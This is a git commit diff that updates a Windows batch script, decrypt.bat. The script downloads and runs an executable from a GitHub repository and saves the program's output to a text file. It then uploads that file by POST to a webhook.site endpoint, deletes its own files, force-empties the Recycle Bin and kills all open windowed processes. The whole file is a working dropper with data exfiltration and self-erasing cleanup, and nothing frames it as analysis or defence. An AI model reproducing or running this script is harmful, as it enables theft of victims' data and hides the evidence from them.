41c2e94cdb57825651603c258718f690217fecb0
mortingenstrasse95 <48433244+mortingenstrasse95@users.noreply.github.com>
2022-02-01 17:33:17 +0300

    Update decrypt.bat

--- decrypt.bat
+++ decrypt.bat
@@ -1,19 +1,33 @@
-start cmd.exe /k "powershell -command "$url = 'https://github.com/mortingenstrasse95/mng/raw/main/decrypt.exe'; $output = 'C:/Users/decrypt.exe'; $start_time = Get-Date; $wc = New-Object System.Net.WebClient; $wc.DownloadFile($url, $output); Write-Output 'Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)';"
 
 
-timeout /t 15
+start cmd.exe /k  "powershell -command mkdir -p C:/Users/Decrypt;"
+timeout /t 2
 
-start cmd.exe /k powershell -command "C:/Users/decrypt.exe | Out-File -FilePath C:/Users/decrypt.txt ;"
+@echo off
+
+start cmd.exe /k  "powershell -command "$url = 'https://github.com/mortingenstrasse95/mng/raw/main/decrypt.exe'; $output = 'C:/Users/Decrypt/decrypt.exe'; $start_time = Get-Date; $wc = New-Object System.Net.WebClient; $wc.DownloadFile($url, $output); Write-Output 'Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)';"
+
+
+timeout /t 10
+@echo off
+
+start cmd.exe /k powershell -command "C:/Users/Decrypt/decrypt.exe | Out-File -FilePath C:/Users/Decrypt/decrypt.txt ;"
 
 timeout /t 10
 
-
-start cmd.exe /k powershell -command Invoke-WebRequest -Uri https://webhook.site/2deed7ff-a76b-4776-a15f-128f5bc846f8 -Method POST -InFile C:/Users/decrypt.txt;"
+@echo off
+start cmd.exe /k powershell -command Invoke-WebRequest -Uri https://webhook.site/2deed7ff-a76b-4776-a15f-128f5bc846f8 -Method POST -InFile C:/Users/Decrypt/decrypt.txt;"
 
 timeout /t 10
 
+@echo off
+start cmd.exe /k powershell -command Remove-Item -path c:\Users\Decrypt, c:\Users\decrypt.bat -recurse; exit;"
+
+timeout /t 10
+
+start cmd.exe /k powershell -command Clear-RecycleBin -Force ;"
+timeout /t 2
+
+start cmd.exe /k powershell -command "(New-Object -comObject Shell.Application).Windows() | foreach-object {$_.quit()}; Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | stop-process"
 
 exit
-
-
-Invoke-WebRequest "$url = 'https://github.com/mortingenstrasse95/mng/raw/main/decrypt.exe'; -OutFile 'C:/Users/decrypt.exe';
